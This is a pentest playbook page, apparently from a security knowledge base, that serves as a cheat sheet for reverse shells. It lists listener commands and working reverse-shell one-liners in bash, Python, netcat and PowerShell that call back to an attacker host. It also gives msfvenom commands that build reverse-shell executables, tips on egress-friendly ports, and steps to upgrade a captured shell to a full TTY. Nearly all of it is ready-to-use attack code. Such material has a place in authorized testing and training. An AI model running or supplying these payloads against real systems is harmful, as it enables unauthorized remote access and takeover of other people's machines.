---
summary: Reverse shells & payloads — catch the connection, one-liners by language, upgrade to a full TTY.
status: active
tags: [security, playbook, shells, payloads]
private: false
---

# Reverse Shells & Payloads

Get code exec → call back to your listener → upgrade to a usable shell.

## Catch it

```bash
nc -lvnp 443            # simple
rlwrap nc -lvnp 443     # + line editing/history
# pwncat-cs -lp 443     # auto-TTY, upload/download, persistence
```

Use a common outbound port (443/80/53) — egress filters often allow them.

## One-liners (LHOST/LPORT = your tun0)

```bash
# bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'
# nc (no -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f
# powershell (Windows)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('$LHOST',$LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([Text.Encoding]::ASCII).GetBytes($r+'PS>'),0,$r.Length+3);$s.Flush()}"
```

For a fussy target, revshells.com generates URL/base64/format-encoded variants.

## msfvenom binaries

```bash
msfvenom -p linux/x64/shell_reverse_tcp   LHOST=$LHOST LPORT=$LPORT -f elf -o s.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o s.exe
```

## Upgrade a dumb shell → full TTY

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
# then in the shell:
export TERM=xterm; stty rows 50 cols 200
```

Now Ctrl-C, arrows, `su`, and `sudo` prompts work.

## Related

- [Pentest Playbook — Index](kb://11-security-playbook-pentest-playbook-index)
- [File Transfer](kb://11-security-playbook-file-transfer)
- [Linux Privilege Escalation](kb://11-security-playbook-linux-privesc)
